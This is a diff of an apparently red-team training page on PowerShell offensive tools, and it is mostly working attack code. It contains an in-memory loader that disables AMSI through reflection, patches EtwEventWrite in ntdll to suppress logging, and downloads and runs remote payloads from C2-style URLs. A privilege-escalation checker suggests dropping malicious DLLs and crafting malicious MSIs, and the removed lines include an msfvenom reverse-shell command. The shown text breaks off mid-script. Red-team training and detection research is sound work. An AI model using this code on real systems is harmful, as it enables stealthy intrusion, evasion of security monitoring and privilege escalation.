@@ -13,798 +13,995 @@ render_with_liquid: false
 
 # PowerShell Offensive Tools
 
-Four complete, standalone PowerShell 7.x scripts for red team operations. Each is a self-contained function with full parameter blocks, comment-based help, and error handling. These complement rather than duplicate the tool-dev section scripts; see also [PowerShell Red Team Cheatsheet](powershell-cheatsheet.md) for the primitives these tools are built on.
+PowerShell remains one of the most powerful post-exploitation platforms available on Windows. It ships with every modern Windows installation, integrates deeply with the .NET framework, and provides direct access to Win32 APIs through reflection and P/Invoke. This module covers four production-grade offensive tools: an in-memory module loader with AMSI/ETW bypass, a local privilege escalation checker, a WMI lateral movement framework, and an encrypted reverse shell.
 
 ---
 
-## Script 1: In-Memory Module Loader with AMSI and ETW Bypass
+## Background: Why PowerShell for Red Teams
 
-Downloads a PowerShell module or script from any URI (HTTP, HTTPS, or UNC path), patches AMSI and ETW telemetry for the current session via reflection, then executes the content entirely from memory using `[ScriptBlock]::Create()`. Nothing is written to disk.
+PowerShell executes inside legitimate Windows processes (powershell.exe, pwsh.exe), generates logs that blend with normal administrative activity, and provides access to the full .NET ecosystem without dropping files to disk. Constrained Language Mode (CLM) and Script Block Logging are the primary defenses; AMSI is the runtime content inspection layer. Understanding how to work within and around these controls is essential for realistic red team operations.
+
+Key concepts before reading these scripts:
+
+- **AMSI (Antimalware Scan Interface):** A Windows API that allows security products to scan script content before execution. PowerShell calls AmsiScanBuffer on each script block.
+- **ETW (Event Tracing for Windows):** A high-performance tracing framework. PowerShell writes execution events via EtwEventWrite in ntdll.dll.
+- **Reflection:** The .NET mechanism for inspecting and invoking private/internal types and methods at runtime, which allows bypassing visibility restrictions.
+- **Script Block Logging:** PowerShell feature (enabled by GPO) that logs all script block content to the Windows Event Log (Event ID 4104).
+
+---
+
+## Script 1: In-Memory PowerShell Module Loader with AMSI/ETW Bypass
+
+This loader downloads a PowerShell script from a URL and executes it entirely in memory. It first disables AMSI by patching the internal initialization flag, then disables ETW by NOP-patching EtwEventWrite in ntdll.dll. Neither payload nor bypass code touches disk.
 
 ```powershell
-function Invoke-MemoryModuleLoader {
+#Requires -Version 5.1
+
 <#
 .SYNOPSIS
-    Downloads and executes a PowerShell module from a remote URI entirely in memory,
-    with optional AMSI and ETW suppression for the current session.
+    Downloads and executes a PowerShell script in memory with AMSI and ETW bypass.
 
 .DESCRIPTION
-    Invoke-MemoryModuleLoader performs the following steps:
-      1. Optionally patches amsiInitFailed via reflection (AMSI bypass).
-      2. Optionally NOPs EtwEventWrite in ntdll.dll (ETW bypass).
-      3. Downloads content from HTTP, HTTPS, or UNC using System.Net.WebClient.
-      4. Creates a ScriptBlock from the downloaded string and dot-sources it.
+    Invoke-MemoryLoader performs three operations in sequence:
+      1. Patches AmsiUtils.amsiInitFailed via reflection to disable AMSI scanning.
+      2. NOP-patches EtwEventWrite in ntdll.dll via VirtualProtect to suppress ETW logging.
+      3. Downloads the target script via WebClient and executes it in-process.
 
-.PARAMETER Uri
-    Target URI. Accepts http://, https://, or \\UNC\share\script.ps1.
+    All execution is in-memory. No files are written to disk.
+
+.PARAMETER Url
+    The URL of the PowerShell script to download and execute.
 
 .PARAMETER Proxy
-    Optional proxy URI string, e.g. 'http://proxy.corp.local:8080'.
+    Optional proxy URL (e.g., http://proxy.corp.local:8080).
 
 .PARAMETER Credential
-    PSCredential for authenticated downloads (Basic auth injected into WebClient).
+    Optional PSCredential for authenticated proxy or download endpoint.
 
-.PARAMETER TLS12
-    Force TLS 1.2 for all .NET HTTP requests in this session.
-
-.PARAMETER BypassAMSI
-    Patch amsiInitFailed to disable AMSI scanning for this session.
-
-.PARAMETER BypassETW
-    NOP EtwEventWrite in ntdll to suppress ETW script-block telemetry.
-
-.PARAMETER Arguments
-    Hashtable of named arguments splatted into the loaded module's entry point
-    if the module exports a function named 'Invoke-Main'.
+.PARAMETER SkipTls
+    If set, disables TLS certificate validation. Use only in controlled lab environments.
 
 .EXAMPLE
-    Invoke-MemoryModuleLoader -Uri 'https://10.10.14.5/implant.ps1' -TLS12 -BypassAMSI -BypassETW
+    Invoke-MemoryLoader -Url 'http://192.168.1.100/payload.ps1' -SkipTls
 
 .EXAMPLE
-    $cred = New-Object PSCredential('user', (ConvertTo-SecureString 'pass' -AsPlainText -Force))
-    Invoke-MemoryModuleLoader -Uri 'http://10.10.14.5/module.ps1' -Credential $cred -BypassAMSI
+    $cred = Get-Credential
+    Invoke-MemoryLoader -Url 'https://c2.example.com/stage2.ps1' -Credential $cred
+
+.NOTES
+    Author: Red Team Academy
+    Requires: PowerShell 5.1 or later, Windows
+    OPSEC: Generates PowerShell Event ID 4103/4104 if Script Block Logging is enabled
+           before the bypass runs. Load this from a reflective launcher, not interactively.
 #>
+
+function Invoke-MemoryLoader {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory)]
-        [string]$Uri,
+        [string]$Url,
 
         [string]$Proxy,
 
         [System.Management.Automation.PSCredential]$Credential,
 
-        [switch]$TLS12,
-
-        [switch]$BypassAMSI,
-
-        [switch]$BypassETW,
-
-        [hashtable]$Arguments = @{}
+        [switch]$SkipTls
     )
 
-    # ── Optional: Force TLS 1.2 ───────────────────────────────────────────────
-    if ($TLS12) {
-        [System.Net.ServicePointManager]::SecurityProtocol =
-            [System.Net.SecurityProtocolType]::Tls12
-        Write-Verbose "[*] TLS 1.2 enforced."
+    # -----------------------------------------------------------------------
+    # Step 1: Patch AMSI — set amsiInitFailed = $true via reflection
+    # -----------------------------------------------------------------------
+    # AmsiUtils is an internal class in System.Management.Automation.
+    # When amsiInitFailed is $true, AMSI scanning is skipped for the entire session.
+    try {
+        $amsiAssembly = [Ref].Assembly
+        $amsiType     = $amsiAssembly.GetType('System.Management.Automation.AmsiUtils')
+        $amsiField    = $amsiType.GetField(
+            'amsiInitFailed',
+            [System.Reflection.BindingFlags]'NonPublic,Static'
+        )
+        $amsiField.SetValue($null, $true)
+        Write-Verbose '[*] AMSI patched: amsiInitFailed = $true'
+    }
+    catch {
+        Write-Warning "[-] AMSI patch failed: $_"
     }
 
-    # ── Optional: AMSI bypass via amsiInitFailed reflection ───────────────────
-    if ($BypassAMSI) {
-        try {
-            $amsiType  = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-            $initField = $amsiType.GetField('amsiInitFailed',
-                            [System.Reflection.BindingFlags]'NonPublic,Static')
-            $initField.SetValue($null, $true)
-            Write-Verbose "[+] AMSI: amsiInitFailed set to true."
-        }
-        catch {
-            Write-Warning "[-] AMSI bypass failed: $($_.Exception.Message)"
-        }
-    }
-
-    # ── Optional: ETW bypass — NOP EtwEventWrite in ntdll ────────────────────
-    if ($BypassETW) {
-        try {
-            $etwSig = @'
+    # -----------------------------------------------------------------------
+    # Step 2: Patch ETW — NOP EtwEventWrite in ntdll.dll via VirtualProtect
+    # -----------------------------------------------------------------------
+    # EtwEventWrite is the kernel32/ntdll export called by the PowerShell ETW provider.
+    # Overwriting the first 6 bytes with RET (0xC3) followed by NOPs (0x90) prevents
+    # the function from writing any ETW events for the lifetime of this process.
+    try {
+        Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
+
 public class EtwPatch {
-    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
-    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
-    [DllImport("kernel32")] public static extern bool VirtualProtect(
-        IntPtr a, UIntPtr s, uint p, out uint o);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualProtect(
+        IntPtr lpAddress,
+        UIntPtr dwSize,
+        uint flNewProtect,
+        out uint lpflOldProtect
+    );
 }
 '@
-            if (-not ([System.Management.Automation.PSTypeName]'EtwPatch').Type) {
-                Add-Type -TypeDefinition $etwSig -Language CSharp
-            }
-            $ntdll = [EtwPatch]::LoadLibrary('ntdll.dll')
-            $addr  = [EtwPatch]::GetProcAddress($ntdll, 'EtwEventWrite')
-            $old   = [uint32]0
-            [EtwPatch]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$old) | Out-Null
-            $nop = [byte[]](0xC3)
-            [System.Runtime.InteropServices.Marshal]::Copy($nop, 0, $addr, 1)
-            [EtwPatch]::VirtualProtect($addr, [UIntPtr]::new(1), $old, [ref]$old) | Out-Null
-            Write-Verbose "[+] ETW: EtwEventWrite patched with RET."
-        }
-        catch {
-            Write-Warning "[-] ETW bypass failed: $($_.Exception.Message)"
-        }
-    }
+        $ntdll     = [EtwPatch]::GetModuleHandle('ntdll.dll')
+        $etwAddr   = [EtwPatch]::GetProcAddress($ntdll, 'EtwEventWrite')
 
-    # ── Download content ──────────────────────────────────────────────────────
-    $content = $null
-    try {
-        $wc = New-Object System.Net.WebClient
-
-        if ($Proxy) {
-            $proxyObj = New-Object System.Net.WebProxy($Proxy, $true)
-            if ($Credential) {
-                $proxyObj.Credentials = $Credential.GetNetworkCredential()
-            }
-            $wc.Proxy = $proxyObj
+        if ($etwAddr -eq [IntPtr]::Zero) {
+            throw 'Could not resolve EtwEventWrite'
         }
 
-        if ($Credential -and -not $Proxy) {
-            $netCred = $Credential.GetNetworkCredential()
-            $wc.Credentials = $netCred
-            # Inject Basic auth header for HTTP servers that need it
-            $pair   = "$($netCred.UserName):$($netCred.Password)"
-            $b64    = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($pair))
-            $wc.Headers.Add('Authorization', "Basic $b64")
+        # RET instruction (0xC3) followed by 5 NOPs (0x90)
+        $patch      = [byte[]]@(0xC3, 0x90, 0x90, 0x90, 0x90, 0x90)
+        $oldProtect = [uint32]0
+
+        # Make the memory region writable (PAGE_EXECUTE_READWRITE = 0x40)
+        $result = [EtwPatch]::VirtualProtect(
+            $etwAddr,
+            [UIntPtr]([uint32]$patch.Length),
+            0x40,
+            [ref]$oldProtect
+        )
+
+        if (-not $result) {
+            throw 'VirtualProtect failed'
         }
 
-        Write-Verbose "[*] Downloading: $Uri"
-        $content = $wc.DownloadString($Uri)
-        Write-Verbose "[+] Retrieved $($content.Length) characters."
+        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etwAddr, $patch.Length)
+
+        # Restore original memory protection
+        [EtwPatch]::VirtualProtect(
+            $etwAddr,
+            [UIntPtr]([uint32]$patch.Length),
+            $oldProtect,
+            [ref]$oldProtect
+        ) | Out-Null
+
+        Write-Verbose '[*] ETW patched: EtwEventWrite returns immediately'
     }
     catch {
-        throw "Download failed from '$Uri': $($_.Exception.Message)"
+        Write-Warning "[-] ETW patch failed: $_"
+    }
+
+    # -----------------------------------------------------------------------
+    # Step 3: Configure WebClient with optional proxy, credential, TLS bypass
+    # -----------------------------------------------------------------------
+    $webClient = New-Object System.Net.WebClient
+
+    if ($SkipTls) {
+        # Disable certificate validation for the current AppDomain — lab use only
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+        [System.Net.ServicePointManager]::SecurityProtocol =
+            [System.Net.SecurityProtocolType]::Tls12 -bor
+            [System.Net.SecurityProtocolType]::Tls11 -bor
+            [System.Net.SecurityProtocolType]::Tls
+        Write-Verbose '[*] TLS validation disabled'
+    }
+
+    if ($Proxy) {
+        $proxyObj = New-Object System.Net.WebProxy($Proxy, $true)
+        if ($Credential) {
+            $proxyObj.Credentials = $Credential.GetNetworkCredential()
+        }
+        $webClient.Proxy = $proxyObj
+        Write-Verbose "[*] Proxy set: $Proxy"
+    }
+
+    if ($Credential -and -not $Proxy) {
+        $webClient.Credentials = $Credential.GetNetworkCredential()
+    }
+
+    # -----------------------------------------------------------------------
+    # Step 4: Download and execute the payload in memory
+    # -----------------------------------------------------------------------
+    try {
+        Write-Verbose "[*] Downloading: $Url"
+        $code = $webClient.DownloadString($Url)
+
+        if ([string]::IsNullOrWhiteSpace($code)) {
+            throw 'Downloaded content is empty'
+        }
+
+        Write-Verbose "[*] Downloaded $($code.Length) characters. Executing in memory..."
+
+        $scriptBlock = [ScriptBlock]::Create($code)
+        $scriptBlock.Invoke()
+
+        Write-Verbose '[*] Execution complete'
+    }
+    catch [System.Net.WebException] {
+        Write-Error "[-] Download failed: $_"
+    }
+    catch {
+        Write-Error "[-] Execution failed: $_"
     }
     finally {
-        if ($wc) { $wc.Dispose() }
-    }
-
-    # ── Execute from memory ───────────────────────────────────────────────────
-    try {
-        $sb = [scriptblock]::Create($content)
-        . $sb   # dot-source so exported functions land in caller's scope
-
-        # If module exports Invoke-Main, call it with any supplied arguments
-        if (Get-Command 'Invoke-Main' -ErrorAction SilentlyContinue) {
-            Write-Verbose "[*] Calling Invoke-Main with provided arguments."
-            Invoke-Main @Arguments
-        }
-        Write-Verbose "[+] Module executed successfully from memory."
-    }
-    catch {
-        throw "Execution failed: $($_.Exception.Message)"
+        $webClient.Dispose()
     }
 }
 ```
 
+### Usage Notes
+
+The AMSI patch uses `[Ref].Assembly` which resolves to `System.Management.Automation.dll` — the same assembly that contains `AmsiUtils`. This is a stable internal type path across PowerShell 5.x versions. On PowerShell 7, the assembly structure differs; verify field names against the specific runtime version. The ETW patch works by overwriting the prologue of `EtwEventWrite` with a RET instruction, which causes all callers (including the PowerShell ETW provider) to return immediately without logging.
+
 ---
 
-## Script 2: Local Privilege Escalation Checker
+## Script 2: Windows Local Privilege Escalation Checker
 
-Enumerates common Windows privilege escalation vectors without touching any external tools. Returns an array of `PSCustomObject` results that can be piped to `Export-Csv` or `ConvertTo-Json`.
+A comprehensive checker that enumerates common Windows privilege escalation vectors and returns structured results. Each finding is a `PSCustomObject` with Type, Path, Detail, and Severity fields, making it easy to pipe into reports or filter by severity.
 
 ```powershell
-function Invoke-LocalPrivescCheck {
+#Requires -Version 5.1
+
 <#
 .SYNOPSIS
-    Enumerates common local privilege escalation vectors on a Windows host.
+    Enumerates common Windows local privilege escalation vectors.
 
 .DESCRIPTION
-    Checks the following without requiring external binaries:
-      - Unquoted service paths
-      - Weak service binary ACLs (writable by non-admin principals)
-      - AlwaysInstallElevated registry keys
-      - Writable directories in the system PATH
-      - Scheduled tasks pointing to writable binaries
-      - Potential DLL hijack candidates in PATH (missing DLLs for running processes)
-      - Autoruns (Run/RunOnce keys) with writable binary paths
+    Invoke-PrivescCheck examines the local system for common privilege escalation
+    opportunities including:
+      - Unquoted service paths with spaces
+      - Writable service binary paths (ACL check)
+      - AlwaysInstallElevated registry keys (HKLM + HKCU)
+      - Writable directories in the system %PATH%
+      - Scheduled tasks whose binary paths are user-writable
+      - Dangerous token privileges (SeImpersonatePrivilege, etc.)
+      - DLL hijacking opportunities in writable PATH directories
 
-.PARAMETER OutputFormat
-    Controls how results are displayed: Table (default), List, CSV, or JSON.
+    Returns an array of PSCustomObject findings sorted by severity.
 
-.PARAMETER ExportPath
-    If specified, writes results to this file path in the chosen OutputFormat.
-
-.EXAMPLE
-    Invoke-LocalPrivescCheck | Where-Object Severity -eq 'HIGH'
+.PARAMETER Severity
+    Filter results to this minimum severity level: Low, Medium, High, Critical.
+    Defaults to Low (all findings returned).
 
 .EXAMPLE
-    Invoke-LocalPrivescCheck -OutputFormat JSON -ExportPath C:\Windows\Temp\privesc.json
+    Invoke-PrivescCheck | Format-Table -AutoSize
+
+.EXAMPLE
+    Invoke-PrivescCheck -Severity High | Select-Object Type, Path, Detail
+
+.NOTES
+    Author: Red Team Academy
+    Run as a standard user for realistic results. Some checks (scheduled tasks)
+    may require elevated rights to enumerate fully.
 #>
+
+function Invoke-PrivescCheck {
     [CmdletBinding()]
     param(
-        [ValidateSet('Table','List','CSV','JSON')]
-        [string]$OutputFormat = 'Table',
-
-        [string]$ExportPath
+        [ValidateSet('Low', 'Medium', 'High', 'Critical')]
+        [string]$Severity = 'Low'
     )
 
-    $findings = [System.Collections.Generic.List[PSCustomObject]]::new()
+    $findings   = [System.Collections.Generic.List[PSCustomObject]]::new()
+    $severityMap = @{ Low = 0; Medium = 1; High = 2; Critical = 3 }
+    $minSev     = $severityMap[$Severity]
 
     function Add-Finding {
-        param([string]$Category, [string]$Severity, [string]$Detail, [string]$Recommendation)
-        $findings.Add([PSCustomObject]@{
-            Category       = $Category
-            Severity       = $Severity
-            Detail         = $Detail
-            Recommendation = $Recommendation
-        })
+        param($Type, $Path, $Detail, $Sev)
+        if ($severityMap[$Sev] -ge $minSev) {
+            $findings.Add([PSCustomObject]@{
+                Type     = $Type
+                Path     = $Path
+                Detail   = $Detail
+                Severity = $Sev
+            })
+        }
     }
 
-    # ── 1. Unquoted service paths ─────────────────────────────────────────────
-    Write-Verbose "[*] Checking unquoted service paths..."
+    # ------------------------------------------------------------------
+    # Check 1: Unquoted service paths containing spaces
+    # ------------------------------------------------------------------
+    Write-Verbose '[*] Checking unquoted service paths...'
     try {
-        Get-WmiObject -Class Win32_Service -ErrorAction Stop |
-        Where-Object { $_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } |
+        Get-WmiObject Win32_Service -ErrorAction Stop |
+            Where-Object {
+                $_.PathName -notmatch '^"'          -and
+                $_.PathName -match ' '              -and
+                $_.PathName -notmatch '^[A-Z]:\\Windows\\'
+            } |
+            ForEach-Object {
+                Add-Finding `
+                    -Type   'UnquotedServicePath' `
+                    -Path   $_.PathName `
+                    -Detail "Service: $($_.Name) | State: $($_.State) | StartMode: $($_.StartMode)" `
+                    -Sev    'High'
+            }
+    }
+    catch {
+        Write-Warning "[-] Unquoted service path check failed: $_"
+    }
+
+    # ------------------------------------------------------------------
+    # Check 2: Writable service binary paths (ACL enumeration)
+    # ------------------------------------------------------------------
+    Write-Verbose '[*] Checking writable service binaries...'
+    try {
+        Get-WmiObject Win32_Service -ErrorAction Stop |
+            Where-Object { $_.PathName } |
+            ForEach-Object {
+                $svc = $_
+                # Strip quotes and extract executable path before arguments
+                $binPath = $svc.PathName -replace '"', ''
+                if ($binPath -match '^(.+?\.exe)') {
+                    $binPath = $Matches[1].Trim()
+                }
+
+                if (Test-Path $binPath -ErrorAction SilentlyContinue) {
+                    try {
+                        $acl = Get-Acl $binPath -ErrorAction Stop
+                        $acl.Access |
+                            Where-Object {
+                                ($_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users') -and
+                                ($_.FileSystemRights  -match 'Write|Modify|FullControl')
+                            } |
+                            ForEach-Object {
+                                Add-Finding `
+                                    -Type   'WritableServiceBinary' `
+                                    -Path   $binPath `
+                                    -Detail "Service: $($svc.Name) | Identity: $($_.IdentityReference) | Rights: $($_.FileSystemRights)" `
+                                    -Sev    'Critical'
+                            }
+                    }
+                    catch { }
+                }
+            }
+    }
+    catch {
+        Write-Warning "[-] Writable service binary check failed: $_"
+    }
+
+    # ------------------------------------------------------------------
+    # Check 3: AlwaysInstallElevated registry keys
+    # ------------------------------------------------------------------
+    Write-Verbose '[*] Checking AlwaysInstallElevated...'
+    $aieHklm = (Get-ItemProperty `
+        'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
+        -Name AlwaysInstallElevated `
+        -ErrorAction SilentlyContinue).AlwaysInstallElevated
+
+    $aieHkcu = (Get-ItemProperty `
+        'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
+        -Name AlwaysInstallElevated `
+        -ErrorAction SilentlyContinue).AlwaysInstallElevated
+
+    if ($aieHklm -eq 1 -and $aieHkcu -eq 1) {
+        Add-Finding `
+            -Type   'AlwaysInstallElevated' `
+            -Path   'HKLM+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' `
+            -Detail 'Both HKLM and HKCU AlwaysInstallElevated = 1. Craft a malicious .msi to obtain SYSTEM.' `
+            -Sev    'Critical'
+    }
+    elseif ($aieHklm -eq 1 -or $aieHkcu -eq 1) {
+        Add-Finding `
+            -Type   'AlwaysInstallElevated' `
+            -Path   'HKLM or HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer' `
+            -Detail "Partial AIE config (HKLM=$aieHklm, HKCU=$aieHkcu). Both keys must be 1 to exploit." `
+            -Sev    'Medium'
+    }
+
+    # ------------------------------------------------------------------
+    # Check 4: Writable directories in %PATH%
+    # ------------------------------------------------------------------
+    Write-Verbose '[*] Checking writable PATH directories...'
+    $env:PATH -split ';' |
+        Where-Object { $_ -and (Test-Path $_ -ErrorAction SilentlyContinue) } |
         ForEach-Object {
-            $svc  = $_
-            $path = $svc.PathName -replace ' .*$', ''
-            # Only flag if an intermediate directory is writable
-            $dirs = $path -split '\\'
-            for ($i = 1; $i -lt $dirs.Count - 1; $i++) {
-                $candidate = ($dirs[0..$i] -join '\') + ' '
-                $parent    = $dirs[0..$i] -join '\'
-                if (Test-Path $parent) {
-                    $acl = Get-Acl $parent -ErrorAction SilentlyContinue
-                    $writable = $acl.Access | Where-Object {
-                        $_.FileSystemRights -match 'Write|FullControl|Modify' -and
-                        $_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users'
-                    }
-                    if ($writable) {
-                        Add-Finding -Category 'UnquotedServicePath' -Severity 'HIGH' `
-                            -Detail "Service '$($svc.Name)' path: $($svc.PathName) | Writable dir: $parent" `
-                            -Recommendation "Place a binary at '${candidate}[name].exe' to hijack service start"
-                    }
-                }
-            }
-        }
-    }
-    catch { Write-Warning "Unquoted service path check failed: $($_.Exception.Message)" }
-
-    # ── 2. AlwaysInstallElevated ──────────────────────────────────────────────
-    Write-Verbose "[*] Checking AlwaysInstallElevated..."
-    $hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
-                -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
-    $hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' `
-                -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
-    if ($hklm -eq 1 -and $hkcu -eq 1) {
-        Add-Finding -Category 'AlwaysInstallElevated' -Severity 'HIGH' `
-            -Detail 'Both HKLM and HKCU AlwaysInstallElevated = 1' `
-            -Recommendation 'Create a malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=... -f msi'
-    }
-
-    # ── 3. Writable directories in PATH ──────────────────────────────────────
-    Write-Verbose "[*] Checking writable PATH directories..."
-    $env:PATH -split ';' | Where-Object { $_ } | ForEach-Object {
-        $dir = $_.Trim()
-        if (Test-Path $dir -PathType Container) {
+            $dir = $_
             try {
-                $acl = Get-Acl $dir -ErrorAction Stop
-                $w   = $acl.Access | Where-Object {
-                    $_.FileSystemRights -match 'Write|FullControl|Modify' -and
-                    $_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users'
-                }
-                if ($w) {
-                    Add-Finding -Category 'WritablePATH' -Severity 'MEDIUM' `
-                        -Detail "Writable PATH dir: $dir" `
-                        -Recommendation 'Drop a hijackable binary here for DLL/EXE hijack'
-                }
+                $testFile = Join-Path $dir ([System.IO.Path]::GetRandomFileName())
+                [System.IO.File]::WriteAllText($testFile, 'rta_test')
+                Remove-Item $testFile -Force -ErrorAction SilentlyContinue
+                Add-Finding `
+                    -Type   'WritablePATHDirectory' `
+                    -Path   $dir `
+                    -Detail 'Current user can write files here. Binary or DLL hijacking possible.' `
+                    -Sev    'High'
             }
-            catch {}
+            catch { }
         }
-    }
 
-    # ── 4. Scheduled tasks with writable binary paths ─────────────────────────
-    Write-Verbose "[*] Checking scheduled task binary paths..."
+    # ------------------------------------------------------------------
+    # Check 5: Scheduled tasks with user-writable binary paths
+    # ------------------------------------------------------------------
+    Write-Verbose '[*] Checking scheduled task binaries...'
     try {
-        Get-ScheduledTask -ErrorAction Stop | ForEach-Object {
-            $task = $_
-            $task.Actions | Where-Object { $_.Execute } | ForEach-Object {
-                $exe = $_.Execute -replace '"', ''
-                if (Test-Path $exe -PathType Leaf -ErrorAction SilentlyContinue) {
-                    $acl = Get-Acl $exe -ErrorAction SilentlyContinue
-                    $w   = $acl.Access | Where-Object {
-                        $_.FileSystemRights -match 'Write|FullControl|Modify' -and
-                        $_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users'
+        Get-ScheduledTask -ErrorAction Stop |
+            Where-Object { $_.Actions } |
+            ForEach-Object {
+                $task = $_
+                $task.Actions |
+                    Where-Object { $_.Execute } |
+                    ForEach-Object {
+                        $binPath = $_.Execute -replace '"', ''
+                        if (Test-Path $binPath -ErrorAction SilentlyContinue) {
+                            try {
+                                $acl = Get-Acl $binPath -ErrorAction Stop
+                                $acl.Access |
+                                    Where-Object {
+                                        ($_.IdentityReference -match 'Everyone|Users|Authenticated Users') -and
+                                        ($_.FileSystemRights  -match 'Write|Modify|FullControl')
+                                    } |
+                                    ForEach-Object {
+                                        Add-Finding `
+                                            -Type   'WritableScheduledTaskBinary' `
+                                            -Path   $binPath `
+                                            -Detail "Task: $($task.TaskName) | RunAs: $($task.Principal.UserId) | Rights: $($_.FileSystemRights)" `
+                                            -Sev    'High'
+                                    }
+                            }
+                            catch { }
+                        }
                     }
-                    if ($w) {
-                        Add-Finding -Category 'ScheduledTaskWeakACL' -Severity 'HIGH' `
-                            -Detail "Task '$($task.TaskName)' -> $exe (writable)" `
-                            -Recommendation 'Replace binary; task will execute it with task principal privileges'
-                    }
-                }
             }
-        }
     }
-    catch { Write-Warning "Scheduled task check failed: $($_.Exception.Message)" }
+    catch {
+        Write-Warning "[-] Scheduled task check requires task scheduler access."
+    }
 
-    # ── 5. Autorun keys with writable executables ─────────────────────────────
-    Write-Verbose "[*] Checking autorun registry paths..."
-    $runKeys = @(
-        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
-        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
-        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
-        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
+    # ------------------------------------------------------------------
+    # Check 6: Token privileges — parse whoami /priv output
+    # ------------------------------------------------------------------
+    Write-Verbose '[*] Checking token privileges...'
+    $dangerousPrivs = @(
+        'SeImpersonatePrivilege',       # Potato attacks
+        'SeAssignPrimaryTokenPrivilege',# Token substitution
+        'SeTcbPrivilege',               # Act as OS
+        'SeBackupPrivilege',            # Read any file
+        'SeRestorePrivilege',           # Write any file
+        'SeCreateTokenPrivilege',       # Create arbitrary tokens
+        'SeLoadDriverPrivilege',        # Load kernel drivers
+        'SeTakeOwnershipPrivilege',     # Take ownership of any object
+        'SeDebugPrivilege'              # Debug and inject into any process
     )
-    foreach ($key in $runKeys) {
-        if (Test-Path $key) {
-            (Get-ItemProperty $key -ErrorAction SilentlyContinue).PSObject.Properties |
-            Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
-                $exe = ($_.Value -split '"')[1]
-                if (-not $exe) { $exe = ($_.Value -split ' ')[0] }
-                if ($exe -and (Test-Path $exe -ErrorAction SilentlyContinue)) {
-                    $acl = Get-Acl $exe -ErrorAction SilentlyContinue
-                    $w   = $acl.Access | Where-Object {
-                        $_.FileSystemRights -match 'Write|FullControl|Modify' -and
-                        $_.IdentityReference -match 'Everyone|Users|Authenticated Users|BUILTIN\\Users'
-                    }
-                    if ($w) {
-                        Add-Finding -Category 'AutorunWeakACL' -Severity 'HIGH' `
-                            -Detail "Autorun '$($_.Name)' -> $exe (writable)" `
-                            -Recommendation 'Replace binary to execute on next logon'
-                    }
+
+    try {
+        $privOutput = & whoami /priv 2>$null
+        foreach ($priv in $dangerousPrivs) {
+            $line = $privOutput | Where-Object { $_ -match $priv }
+            if ($line) {
+                $enabled = $line -match 'Enabled'
+                $sev     = if ($enabled) { 'High' } else { 'Medium' }
+                Add-Finding `
+                    -Type   'DangerousTokenPrivilege' `
+                    -Path   'Process Token' `
+                    -Detail "$priv | Enabled: $enabled | Potato / token impersonation attacks may apply." `
+                    -Sev    $sev
+            }
+        }
+    }
+    catch {
+        Write-Warning "[-] whoami /priv parsing failed: $_"
+    }
+
+    # ------------------------------------------------------------------
+    # Check 7: DLL hijacking — missing DLLs in writable PATH directories
+    # ------------------------------------------------------------------
+    Write-Verbose '[*] Checking DLL hijacking opportunities in PATH...'
+    # Well-known DLLs that applications often load from PATH without an absolute path
+    $knownMissingDlls = @(
+        'wbemcomn.dll',
+        'version.dll',
+        'uxtheme.dll',
+        'cryptbase.dll',
+        'cryptsp.dll',
+        'dbghelp.dll',
+        'wininet.dll'
+    )
+    $pathDirs = $env:PATH -split ';' |
+        Where-Object { Test-Path $_ -ErrorAction SilentlyContinue }
+
+    foreach ($dll in $knownMissingDlls) {
+        foreach ($dir in $pathDirs) {
+            $dllPresent = Test-Path (Join-Path $dir $dll) -ErrorAction SilentlyContinue
+            if (-not $dllPresent) {
+                # Check if we can write here
+                try {
+                    $testFile = Join-Path $dir ([System.IO.Path]::GetRandomFileName())
+                    [System.IO.File]::WriteAllText($testFile, 'rta_test')
+                    Remove-Item $testFile -Force -ErrorAction SilentlyContinue
+                    Add-Finding `
+                        -Type   'DLLHijackingOpportunity' `
+                        -Path   $dir `
+                        -Detail "Missing '$dll' in writable PATH dir. Drop malicious DLL here to hijack loading." `
+                        -Sev    'Medium'
                 }
+                catch { }
             }
         }
     }
 
-    # ── Output ────────────────────────────────────────────────────────────────
-    if ($findings.Count -eq 0) {
-        Write-Host "[+] No obvious privesc vectors found." -ForegroundColor Green
-        return
+    # Sort by severity descending and return
+    $findings | Sort-Object @{
+        Expression = { $severityMap[$_.Severity] }
+        Descending = $true
     }
-
-    $output = switch ($OutputFormat) {
-        'CSV'  { $findings | ConvertTo-Csv -NoTypeInformation }
